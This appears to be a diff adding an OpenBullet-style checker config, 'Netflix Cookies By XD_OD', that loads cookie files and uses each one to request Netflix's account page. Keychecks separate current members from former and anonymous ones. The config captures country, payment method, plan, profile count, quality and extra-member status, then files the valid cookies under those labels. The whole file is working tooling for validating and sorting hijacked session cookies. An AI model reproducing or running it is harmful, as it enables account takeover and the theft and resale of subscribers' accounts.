@@ -1,0 +1,102 @@
+[SETTINGS]
+{
+  "Name": "Netflix Cookies By XD_OD",
+  "Type": 1,
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2024-04-25T14:27:45.2537881+00:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@Evokkers",
+  "Version": "1.3.1",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+COOKIECONTAINER "netflix" "<COOKIEPATH>" -> SAVE "X" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<X>" Contains "3" 
+  KEYCHAIN Failure OR 
+    KEY "<X>" DoesNotContain "3" 
+
+#CHECK REQUEST GET "https://www.netflix.com/youraccount" 
+  
+  COOKIE "<X>" 
+  HEADER ": scheme:" 
+  HEADER "Accept: " 
+  HEADER "Accept-Encoding: " 
+  HEADER "Accept-Language: " 
+  HEADER "Cache-Control: " 
+  HEADER "Priority: " 
+  HEADER "Sec-Ch-Ua: " 
+  HEADER "Sec-Ch-Ua-Mobile: " 
+  HEADER "Sec-Ch-Ua-Model: " 
+  HEADER "Sec-Ch-Ua-Platform: " 
+  HEADER "Sec-Ch-Ua-Platform-Version: " 
+  HEADER "Sec-Fetch-Dest: " 
+  HEADER "Sec-Fetch-Mode: " 
+  HEADER "Sec-Fetch-Site: " 
+  HEADER "Sec-Fetch-User: " 
+  HEADER "Upgrade-Insecure-Requests: " 
+  HEADER "User-Agent: " 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "CURRENT_MEMBER\":true" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "NEVER_MEMBER\":true" 
+    KEY "FORMER_MEMBER\":true" 
+  KEYCHAIN Failure OR 
+    KEY "ANONYMOUS\":true" 
+  KEYCHAIN Retry OR 
+    KEY "<RESPONSECODE>" Contains "403" 
+
+#Country PARSE "<SOURCE>" LR "\"countryOfSignup\":\"" "\"" CreateEmpty=FALSE -> CAP "Country" 
+
+#PM PARSE "<SOURCE>" LR "growthPaymentMethods\":[{\"__typename\":\"Growth" "PaymentMethod\",\"" CreateEmpty=FALSE -> CAP "Payment Method" 
+
+#Plan PARSE "<SOURCE>" LR "{\"__typename\":\"GrowthPlan\",\"name\":\"" "\"," CreateEmpty=FALSE -> CAP "Plan" 
+
+#Profiles_Count PARSE "<SOURCE>" LR "numProfiles\":" ",\"" CreateEmpty=FALSE -> CAP "Profiles Count" 
+
+#Quality PARSE "<SOURCE>" LR "videoQuality\":{\"fieldType\":\"String\",\"value\":\"" "\"" CreateEmpty=FALSE -> CAP "Quality" 
+
+IF "<SOURCE>" Contains "/accountowner/addextramember"
+
+#Extra_Member FUNCTION Constant "Extra_Members = Yes" -> CAP "Has Extra Member" 
+
+ENDIF
+
+#Extra_Member FUNCTION Constant "Extra_Members = NO" -> VAR "Has Extra Member" 
+
+#UnixTime FUNCTION CurrentUnixTime -> VAR "unixtime" 
+
+#Date FUNCTION UnixTimeToDate "yyyy-MM-dd" "<unixtime>" -> VAR "Date" 
+
+UTILITY File "Cookies/Netflix Full Cap/<Date>/[<Country>] [<Payment Method>] [<Plan>] [<Has Extra Member>].txt" AppendLines "<COOKIENETSCAPE>" 
+
